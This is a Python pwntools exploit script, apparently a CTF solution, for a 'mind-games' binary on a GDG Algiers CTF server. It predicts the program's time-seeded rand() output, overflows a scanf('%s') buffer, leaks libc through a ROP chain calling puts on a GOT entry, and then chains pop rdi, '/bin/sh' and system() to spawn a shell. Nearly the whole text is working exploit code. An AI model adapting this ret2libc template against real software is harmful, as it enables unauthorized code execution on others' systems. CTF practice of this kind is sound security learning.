#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./mind-games")

libc = exe.libc

HOST, PORT = "pwn.chal.ctf.gdgalgiers.com", 1404

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True
# Offset to return address
RETADDR_OFF = 32 + 4 * 2 + 2 * 8

def main():
    global io

    # Load useful gadgets
    ropexe = ROP(exe)
    pop_rdi = ropexe.find_gadget(["pop rdi", "ret"]).address
    ret = ropexe.find_gadget(["ret"]).address

    # Load libc library to generate the same random numbers
    libc_funcs = CDLL(libc.path)

    io = conn()

    # srand(time(NULL))
    libc_funcs.srand(libc_funcs.time(0))

    io.recvuntil(b"? ")

    # rand()
    randnum = libc_funcs.rand();
    log.info(f"randnum: {randnum}")

    # Stage 1: Leak libc address and return to main

    # Vuln: scanf("%s") is vulnerable to buffer overflow

    # Payload structure:
    # - correct guess
    # - padding to return address
    # - pop rdi; GOT["srand"]
    # - puts@plt
    # - @main
    payload = f"{randnum}".encode() + b"\0"
    pad = RETADDR_OFF - len(payload)
    payload += flat(
        cyclic(pad),
        pop_rdi,
        exe.got.srand,
        exe.plt.puts,
        exe.sym.main,
    )
    # Avoid characters that break scanf
    assert(all(c not in payload for c in b"\n "))

    io.sendline(payload)

    # Receive until end of fake flag
    io.recvuntil(b"games!\n")

    # srand(time(NULL))
    libc_funcs.srand(libc_funcs.time(0))

    # Receive libc leak
    buf = io.recvline()[:-1]
    libc.address = leak(buf, libc.sym.srand, "libc", verbose=True)

    # rand()
    randnum = libc_funcs.rand();
    log.info(f"randnum: {randnum}")

    # Stage 2: ROP to system("/bin/sh")

    # Payload structure:
    # - correct guess
    # - padding to return address
    # - pop rdi; @"/bin/sh\0"
    # - ret (for stack alignment)
    # - system@libc
    payload = f"{randnum}".encode() + b"\0"
    pad = RETADDR_OFF - len(payload)
    payload += flat(
        cyclic(pad),
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        ret,
        libc.sym.system,
    )
    # Avoid characters that break scanf
    assert(all(c not in payload for c in b"\n "))

    io.recvuntil(b"? ")
    io.sendline(payload)

    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
